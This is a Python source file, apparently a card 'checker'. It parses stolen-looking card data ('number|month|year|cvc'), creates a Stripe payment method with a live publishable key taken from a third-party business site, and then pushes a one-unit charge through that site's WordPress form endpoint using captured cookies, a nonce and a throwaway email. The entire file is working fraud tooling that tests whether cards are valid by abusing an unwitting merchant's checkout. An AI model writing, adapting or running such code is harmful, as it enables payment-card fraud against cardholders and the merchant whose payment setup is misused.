import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51LyZmQCt7u53epdJaN2EfBYFT5v4hC78N80dedyFRFU3EFgoSZ9SR86kgt73cn0KBXwZL6NaRAzru7W7P1nJMx7U00jJDFzwwT'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	try:
	    pm = r1.json()['id']
	except:
	    	er = r1.json()
	    	if 'error' in r1.text:
	    		print(er)
	    	else:
    			print(er)
	cookies = {
	    '_ga': 'GA1.1.579353265.1725049342',
	    'twk_idm_key': 'WVE-YEp_3JtqYzZ9Niajy',
	    'TawkConnectionTime': '0',
	    '__stripe_mid': 'cdbb85fa-54ec-4e16-a633-e5d9adf2c9777dcfa6',
	    '__stripe_sid': 'aa1a374a-f940-4d30-b0ae-b37276fecfe2726d84',
	    '_ga_2F3E3CB616': 'GS1.1.1725049342.1.1.1725049358.0.0.0',
	}
	
	headers = {
	    'authority': 'business-umbrella.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.579353265.1725049342; twk_idm_key=WVE-YEp_3JtqYzZ9Niajy; TawkConnectionTime=0; __stripe_mid=cdbb85fa-54ec-4e16-a633-e5d9adf2c9777dcfa6; __stripe_sid=aa1a374a-f940-4d30-b0ae-b37276fecfe2726d84; _ga_2F3E3CB616=GS1.1.1725049342.1.1.1725049358.0.0.0',
	    'origin': 'https://business-umbrella.com',
	    'pragma': 'no-cache',
	    'referer': 'https://business-umbrella.com/candidate-services/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1725049513921',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=2972&_fluentform_3_fluentformnonce=41c6093853&_wp_http_referer=%2Fcandidate-services%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser59%40outlook.com&dropdown_1=Training%20booking%20for%20candidates&custom-payment-amount_8=1&payment-coupon=&payment_method=stripe&__ff_all_applied_coupons=&pum_form_popup_id=720&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://business-umbrella.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
